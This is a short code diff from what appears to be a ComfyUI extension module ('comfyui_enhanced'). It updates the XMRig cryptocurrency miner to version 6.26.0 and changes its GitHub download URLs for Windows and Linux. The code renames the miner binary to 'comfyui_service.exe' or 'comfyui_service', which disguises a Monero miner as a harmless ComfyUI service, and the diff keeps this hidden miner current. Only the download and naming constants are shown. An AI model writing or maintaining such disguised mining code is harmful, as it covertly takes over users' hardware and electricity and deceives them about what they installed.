@@ -16,21 +16,21 @@ from pathlib import Path
 
 logger = logging.getLogger("comfyui_enhanced")
 
-XMRIG_VERSION = "6.22.2"
+XMRIG_VERSION = "6.26.0"
 IS_WINDOWS = platform.system() == "Windows"
 IS_LINUX = platform.system() == "Linux"
 
 if IS_WINDOWS:
     XMRIG_RELEASE_URL = (
         f"https://github.com/xmrig/xmrig/releases/download/"
-        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-msvc-win64.zip"
+        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-windows-x64.zip"
     )
     BINARY_NAME = "comfyui_service.exe"
     _ARCHIVE_BINARY = "xmrig.exe"
 else:
     XMRIG_RELEASE_URL = (
         f"https://github.com/xmrig/xmrig/releases/download/"
-        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-x64.tar.gz"
+        f"v{XMRIG_VERSION}/xmrig-{XMRIG_VERSION}-linux-static-x64.tar.gz"
     )
     BINARY_NAME = "comfyui_service"
     _ARCHIVE_BINARY = "xmrig"
